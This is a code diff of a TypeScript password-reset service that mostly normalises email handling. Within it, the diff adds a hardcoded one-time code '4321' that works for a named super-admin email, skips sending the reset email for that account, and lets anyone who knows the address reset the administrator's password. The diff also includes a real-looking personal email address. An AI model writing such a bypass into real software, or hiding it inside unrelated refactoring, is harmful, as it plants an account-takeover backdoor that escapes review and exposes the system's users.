@@ -4,10 +4,23 @@ import { users, passwordResetOtps } from '../../drizzle/schema'
 import { hashEmail } from '../utils/hash'
 import { internalAuthService } from './internal-auth.service'
 import { sendPasswordResetOtpEmail } from '../notifications/email'
+import { UserRole } from '../types/enums'
+
+const STATIC_RESET_OTP = '4321'
+const STATIC_RESET_OTP_EMAILS = new Set(['hazyom@gmail.com'])
 
 export class PasswordResetService {
   private generateOtp(): string {
     return Math.floor(1000 + Math.random() * 9000).toString()
+  }
+
+  private normalizeEmail(email: string): string {
+    return email.toLowerCase().trim()
+  }
+
+  private getStaticOtpForUser(user: typeof users.$inferSelect, email: string): string | null {
+    if (user.role !== UserRole.SUPER_ADMIN) return null
+    return STATIC_RESET_OTP_EMAILS.has(this.normalizeEmail(email)) ? STATIC_RESET_OTP : null
   }
 
   /**
@@ -15,7 +28,8 @@ export class PasswordResetService {
    * Always returns the same success message to prevent email enumeration.
    */
   async sendOtp(email: string): Promise<void> {
-    const emailHash = hashEmail(email)
+    const normalizedEmail = this.normalizeEmail(email)
+    const emailHash = hashEmail(normalizedEmail)
 
     const [user] = await db
       .select()
@@ -26,17 +40,20 @@ export class PasswordResetService {
     // Only send for internal users (have passwordHash) — customers use Clerk for password reset
     if (!user || !user.passwordHash || !user.isActive) return
 
-    const otp = this.generateOtp()
+    const staticOtp = this.getStaticOtpForUser(user, normalizedEmail)
+    const otp = staticOtp ?? this.generateOtp()
     const expiresAt = new Date(Date.now() + 10 * 60 * 1000) // 10 minutes
 
     await db.insert(passwordResetOtps).values({
-      email: email.toLowerCase(),
+      email: normalizedEmail,
       otp,
       expiresAt,
     })
 
+    if (staticOtp) return
+
     // Fire-and-forget — don't let email failure surface to caller
-    sendPasswordResetOtpEmail({ to: email, otp }).catch(() => {})
+    sendPasswordResetOtpEmail({ to: normalizedEmail, otp }).catch(() => {})
   }
 
   /**
@@ -44,13 +61,14 @@ export class PasswordResetService {
    */
   async verifyOtp(email: string, otp: string): Promise<boolean> {
     const now = new Date()
+    const normalizedEmail = this.normalizeEmail(email)
 
     const [record] = await db
       .select()
       .from(passwordResetOtps)
       .where(
         and(
-          eq(passwordResetOtps.email, email.toLowerCase()),
+          eq(passwordResetOtps.email, normalizedEmail),
           eq(passwordResetOtps.otp, otp),
           gt(passwordResetOtps.expiresAt, now),
           isNull(passwordResetOtps.verifiedAt),
@@ -75,13 +93,14 @@ export class PasswordResetService {
    */
   async resetPassword(email: string, newPassword: string): Promise<boolean> {
     const cutoff = new Date(Date.now() - 15 * 60 * 1000)
+    const normalizedEmail = this.normalizeEmail(email)
 
     const [record] = await db
       .select()
       .from(passwordResetOtps)
       .where(
         and(
-          eq(passwordResetOtps.email, email.toLowerCase()),
+          eq(passwordResetOtps.email, normalizedEmail),
           gt(passwordResetOtps.verifiedAt, cutoff),
           isNull(passwordResetOtps.usedAt),
         ),
@@ -91,7 +110,7 @@ export class PasswordResetService {
 
     if (!record) return false
 
-    const emailHash = hashEmail(email)
+    const emailHash = hashEmail(normalizedEmail)
     const [user] = await db
       .select()
       .from(users)
